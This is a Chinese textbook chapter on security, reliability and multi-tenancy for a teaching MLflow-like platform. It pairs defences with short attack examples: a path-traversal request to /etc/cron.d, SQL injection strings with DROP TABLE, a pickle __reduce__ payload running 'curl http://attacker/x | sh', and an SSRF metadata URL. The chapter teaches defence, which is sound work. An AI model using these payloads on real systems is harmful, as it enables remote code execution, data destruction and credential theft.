# 第 20 章 安全、可靠性与多租户：从教学实现到生产系统

## 学习目标

- 用威胁模型识别 MLflow 类平台的资产、入口和攻击面。
- 理解路径穿越、SQL 注入、pickle RCE、XSS、CSRF 的具体利用方式。
- 设计鉴权、租户隔离、审计和备份策略。
- 明确 MiniMLflow 的安全边界，不把演示当生产。

## 20.1 资产与威胁模型

需要保护的资产：

- 实验元数据（配方、指标、用户）；
- 模型制品（知识产权、权重）；
- 训练数据引用/样本（隐私）；
- 凭据（云存储、数据库、LLM API key）；
- 审计记录；
- 服务可用性。

攻击者：

- 外部未授权用户；
- 内部越权用户（想看别的团队实验）；
- 恶意模型/项目上传者；
- 被攻陷的客户端；
- 供应链（依赖、镜像、模型文件）。

信任边界：

```text
浏览器/客户端  ──TLS/网关──>  Tracking Server  ──>  DB
                                      │
                                      └──>  Artifact Store
```

任何跨边界的输入都不可信。

## 20.2 认证与授权

Mini 只有共享 token：

- 有 token = 全权限；
- 无 token = 拒绝（除 health）；
- 没有用户身份/租户。

生产至少：

- OIDC/OAuth2/SAML 身份；
- 服务账号与短期 token；
- 实验级/模型级 RBAC；
- 租户隔离（数据 + 存储 + 查询）；
- API token 轮换与吊销；
- 审计每次写操作。

授权模型示例：

```text
role viewer:  读实验/run/artifact
role trainer: 创建 run、写指标/artifact
role publisher: 注册模型、改 alias
role admin:   管理用户/配额/删除
```

不要把“能访问服务器”当成“能发布模型”。

真实 MLflow 3.13+ 把这套示意做成了平台机制：

- `role_permissions(role, resource_type, resource_pattern, permission)` 把权限打包成可复用角色；
- 权限级别是 `READ → USE → EDIT → MANAGE`；
- 3.17 把权限下沉到 run、trace、assessment、prompt_version、scorer_version、mcp_server_version 等子资源，并引入显式 `DENY`——DENY 覆盖同一层级的正向 grant；
- 3.18 的数据库迁移要求 MCP 版本名在 MySQL/SQL Server 上大小写一致，否则迁移会在改 schema 前中止。

设计时要注意两点。第一，**资源解析顺序**：先认证 principal，再解析 workspace，再解析资源，最后授权；反过来写会留下“按 ID 查到资源后再判断归属”的越权窗口。第二，**DENY 的优先级必须被测试固定**，否则一次重构就可能把例外规则变成空操作。完整模型见第 37.4 节。

## 20.3 路径穿越

攻击：

```http
POST /artifacts/log
{"run_id":"...", "path":"../../../../etc/cron.d/evil", ...}
```

如果直接 `Path(run_dir) / user_path`，可能写出 artifact 根，甚至覆盖系统文件。

防线：

- 拒绝绝对路径/盘符/`..`/NUL；
- `resolve()` 后做 `relative_to(root)`；
- 下载目录同样限制；
- 服务进程使用低权限账号/容器；
- artifact 根使用独立卷。

Mini 的 `safe_join` 实现了前三条；生产还应加只读挂载/最小权限。

## 20.4 SQL 注入

攻击：

```text
filter=1=1 OR (SELECT ...)
order_by=metrics.acc DESC; DROP TABLE runs
```

防线：

- 不拼接用户输入；
- 字段白名单；
- 值绑定参数；
- 动态 ORDER BY 的字段名也只能来自白名单；
- 限制表达式长度/嵌套深度；
- 最小数据库权限（应用账号不能 DROP）。

Mini 的搜索编译器就是示例；测试包含注入字符串。

## 20.5 反序列化 RCE

pickle/cloudpickle 在加载时执行代码。攻击：

```python
class Payload:
    def __reduce__(self):
        return (os.system, ("curl http://attacker/x | sh",))
```

如果服务端加载用户上传的模型：

- 容器被攻陷；
- 云凭据被窃取；
- 横向移动到数据库/对象存储。

防线：

- 只加载可信来源；
- 制品签名 + digest；
- 隔离沙箱/独立进程/无网络；
- 禁用危险反序列化；
- 扫描/准入；
- 最小权限运行。

Mini 直接拒绝未知 loader，是安全默认，不是功能缺失。

## 20.6 XSS 与 CSRF

XSS：

- 实验名 `<script>...</script>` 被 UI 原样输出；
- artifact HTML 被同源内联渲染；
- trace 的 request/response 含恶意 HTML。

防线：

- 全量 HTML 转义；
- artifact 强制下载 + `nosniff`；
- CSP；
- 不让用户控制 `Content-Type`。

CSRF：

- 浏览器已登录（Cookie），攻击者诱导提交写请求；
- 防御：SameSite、CSRF token、Origin 校验、写操作要求 Bearer。

Mini 的 Cookie 仅用于 UI 读取；API 写操作仍建议 Bearer。生产应使用成熟身份代理。

## 20.7 秘密管理

不要：

- 把 token/密码写进代码、配置文件、Notebook；
- 在日志中打印 `Authorization`；
- 把云凭证放进 artifact；
- 用同一 token 给所有环境。

应该：

- secret manager（Vault/KMS/云 secret）；
- 短期凭证/实例角色；
- 环境隔离；
- 轮换；
- 扫描提交历史。

### 20.7.1 Prompt 与 Gateway 的新攻击面

Prompt Registry 和 AI Gateway 把风险从“数据库”扩展到“模型输入输出”：

| 风险 | 例子 | 防线 |
|---|---|---|
| 模板注入 | 模板里写 `{name.__class__}` 或 Jinja 控制流 | 只做受控变量替换；拒绝控制结构 |
| 变量泄漏 | 把密钥当变量渲染进 prompt | 变量白名单；调用前脱敏 |
| Prompt injection | 用户输入覆盖系统指令 | 输入隔离、指令分层、输出校验 |
| 跨租户读取 | 通过 prompt name 读到别的团队模板 | 命名空间与权限 |
| Gateway 密钥泄漏 | 配置文件里写明文 key | 只存环境变量名；secret manager |
| Provider 滥用 | 无限流导致账单爆炸 | 每 route/租户配额、预算告警 |
| 缓存串租户 | 缓存 key 不含租户/权限上下文 | key 包含租户与安全上下文 |
| 日志泄漏 | 记录完整 prompt/response | 脱敏、截断、采样、保留期 |

Mini 的约束：

- 模板只支持 `{{var}}`，拒绝 `{%`/`{#`；
- Gateway 配置可 redaction，密钥通过 `api_key_env` 间接引用；
- 限流是单进程、无租户维度，不能直接用于多租户生产；
- 缓存 key 只含 route/messages/params，不含用户/租户，因此不适合个性化场景。

结论：**Prompt/Gateway 的安全边界必须在设计时就写清楚，不能靠“上线后再加”。**

### 20.7.2 Webhook 的 SSRF、重放与密钥

Webhook 让服务器主动请求用户提供的 URL，天然带来三类风险：

| 风险 | 例子 | 防线 |
|---|---|---|
| SSRF | `http://169.254.169.254/latest/meta-data/` | 私网/元数据地址封禁、DNS 解析校验、出口代理 |
| 重定向逃逸 | 合法 URL 30x 到内网 | 不跟随重定向，或在代理层重校验 |
| 重放 | 攻击者重发旧签名请求 | 校验 `X-Mlflow-Timestamp` 窗口 + delivery id 去重 |
| 密钥泄漏 | secret 出现在日志/API/错误响应 | secret 加密存储、`to_dict` 脱敏、日志过滤 |
| 重复副作用 | 接收方多次处理同一事件 | 按 `X-Mlflow-Delivery-ID` 幂等 |
| 事件风暴 | 高频 tag 变更触发大量 POST | 采样/合并、配额、异步队列 |

Mini 的防线是 scheme/凭据/fragment 校验、禁重定向、HMAC 签名和 outbox；**没有**私网地址封禁、DNS rebinding 防护、secret 加密和多副本 claiming。第 38 章给出完整清单。

## 20.8 可靠性与一致性

关键失败模式：

1. **数据库提交成功，artifact 上传失败**：run 有记录但模型缺失。
2. **artifact 成功，数据库失败**：孤儿文件。
3. **模型版本注册成功，响应丢失**：客户端重试重复版本。
4. **删除 run，但版本仍引用**：部署失败。
5. **SQLite 锁超时**：写请求 500/超时。
6. **Trace 同步写阻塞**：在线延迟上升。

对策：

- 幂等键；
- 对账任务（扫描 run → artifact、版本 → source）；
- 软删除 + 引用检查 + 保留期；
- 重试与超时；
- 异步 trace + 背压；
- 监控写入延迟/错误率。

## 20.9 备份与灾难恢复

RPO/RTO 目标决定方案：

- SQLite：文件快照 + WAL checkpoint；停机复制或 `backup` API；
- Postgres：PITR + 定期全量；
- 对象存储：版本控制 + 跨区域复制；
- 元数据与 artifact 的备份时间点要尽量一致。

恢复演练：

- 从备份恢复数据库；
- 校验 artifact 引用；
- 校验模型版本可加载；
- 记录恢复点与数据丢失范围。

只备份数据库不备份 artifact，是最常见的“假备份”。

## 20.10 多租户

隔离维度：

- 身份/权限；
- 元数据（实验、模型命名空间）；
- artifact 路径/桶；
- 查询（不能通过搜索看到别租户）；
- 配额/限流；
- 审计。

实现方式：

- 共享库 + tenant_id 列 + 行级安全；
- 每租户独立 schema/数据库；
- 每租户独立 bucket/前缀。

难点：

- 跨租户去重会泄漏存在性；
- 共享缓存 key 必须带租户；
- 模型加载进程可能缓存了别租户模型；
- Trace 负载可能含敏感数据。

Mini 没有租户概念；生产必须从 schema、auth、artifact 三处同时设计，不能只加一个 header。

## 20.11 限流与配额

需要限制：

- 每用户/租户的请求速率；
- artifact 上传大小/带宽；
- 单次搜索的结果数/耗时；
- trace 写入量；
- 模型版本数/存储量。

策略：

- token bucket；
- 请求体/响应体上限；
- 查询超时/取消；
- 配额告警/拒绝；
- 隔离大客户。

## 20.12 审计

必须记录：

- 谁创建/删除实验；
- 谁写参数/指标；
- 谁注册/提升/删除模型版本；
- 谁修改 alias；
- 谁访问/下载模型；
- 失败与拒绝。

审计日志要：

- 追加式、不可篡改；
- 与业务库分离；
- 保留合规要求的时间；
- 可查询；
- 不含秘密。

## 20.13 Mini 的安全边界

已实现：

- 路径 containment；
- 参数化搜索；
- 禁止未知 loader；
- HTML 转义；
- 单 token 鉴权；
- 请求体上限；
- 安全响应头；
- prompt 模板受控替换；
- assessment 值类型/来源校验；
- gateway 密钥引用与单进程限流；
- webhook URL 校验、禁重定向、HMAC 签名与 outbox。

未实现：

- 用户/租户；
- RBAC；
- TLS 终止（可直接用 `--tls-cert` 但无证书管理）；
- CSRF token；
- 分布式限流/配额（Gateway 只有单进程 token bucket）；
- 审计；
- 反序列化沙箱；
- 备份/恢复工具；
- webhook secret 加密、私网地址封禁与 DNS rebinding 防护；
- HA。

结论：**Mini 只能用于本地/可信网络教学，不能直接暴露到公网。**

## 20.14 与真实 MLflow 的差距

- 真实 MLflow 支持 basic auth、OIDC、云 IAM；3.13+ 提供角色化 RBAC，3.17+ 支持子资源与显式 DENY，3.10+ 支持工作区（取决于部署）；
- 真实系统有更成熟的数据库/对象存储/迁移/监控；
- 真实 trace/模型服务有更多安全控制；
- 但“pickle RCE、路径穿越、误配置”在生产中依然常见，不能假设用了 MLflow 就安全。

## 小结

- 安全要从资产、入口、信任边界出发，不能只加一个 token。
- 路径穿越、SQL 注入、反序列化 RCE、XSS/CSRF 是四类高频风险。
- 可靠性问题多来自跨系统一致性；幂等、对账、GC 是核心。
- 多租户必须同时隔离元数据、制品、查询与缓存。
- Mini 是教学系统，生产必须补齐身份、权限、审计和 HA。

## 练习

1. 为一个多租户 MLflow 设计 tenant_id 的 schema 与查询注入方式。
2. 画出一个“模型版本注册成功但 artifact 丢失”的对账流程。
3. 设计一个安全的模型准入清单（至少 8 项）。

---

下一章：[第 21 章 测试与验证](21-testing-verification.md)
